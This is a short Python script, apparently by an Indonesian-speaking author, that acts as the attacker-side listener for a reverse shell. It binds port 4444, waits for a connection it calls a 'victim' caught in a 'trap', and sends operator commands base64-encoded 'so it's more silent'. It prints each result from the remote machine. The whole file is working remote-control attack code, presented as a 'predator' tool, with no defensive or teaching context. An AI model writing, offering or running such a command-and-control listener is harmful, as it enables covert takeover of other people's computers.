import socket, base64

def start_boss():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("0.0.0.0", 4444))
    s.listen(1)
    print("[+] DARK VERSE BOSS AKTIF | NUNGGU KORBAN... 😈")
    
    conn, addr = s.accept()
    print(f"[!] KORBAN MASUK PERANGKAP: {addr}")
    
    while True:
        cmd = input("Predator@Shell:~$ ")
        if not cmd: continue
        
        # Kirim perintah dalam bentuk Base64 biar lebih "silent"
        encoded_cmd = base64.b64encode(cmd.encode())
        conn.send(encoded_cmd)
        
        if cmd.lower() in ["exit", "quit"]:
            break
            
        result = conn.recv(1024 * 50).decode()
        print(result)
    conn.close()

if __name__ == "__main__":
    start_boss()
